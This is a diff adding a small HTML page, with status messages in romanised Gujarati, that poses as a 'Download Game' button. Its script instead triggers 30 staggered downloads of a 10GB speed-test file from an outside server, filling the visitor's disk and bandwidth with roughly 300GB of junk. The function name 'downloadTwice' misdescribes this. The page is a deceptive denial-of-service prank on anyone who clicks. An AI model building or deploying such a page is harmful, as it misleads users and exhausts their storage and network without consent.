@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="gu">
+<head>
+<meta charset="UTF-8">
+<title>Download Game</title>
+<style>
+body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f2f2f2; }
+button { padding: 16px 32px; font-size: 18px; background: #2e7d32; color: white; border: none; border-radius: 8px; cursor: pointer; }
+button:hover { background: #256428; }
+p { color: #555; margin-top: 12px; }
+</style>
+</head>
+<body>
+<button onclick="downloadTwice()">Download Game</button>
+<p id="status"></p>
+<script>
+const DOWNLOAD_COUNT = 30;
+function downloadTwice() {
+  const fileUrl = "https://hil-speed.hetzner.com/10GB.bin";
+  document.getElementById('status').innerText = "Download shuru thai rahyu chhe...";
+  for (let i = 1; i <= DOWNLOAD_COUNT; i++) {
+    setTimeout(() => {
+      const link = document.createElement('a');
+      link.href = fileUrl;
+      link.download = "file" + i + ".bin";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      if (i === DOWNLOAD_COUNT) {
+        document.getElementById('status').innerText = DOWNLOAD_COUNT + " downloads chalu thai gaya!";
+      }
+    }, i * 800);
+  }
+}
+</script>
+</body>
+</html>
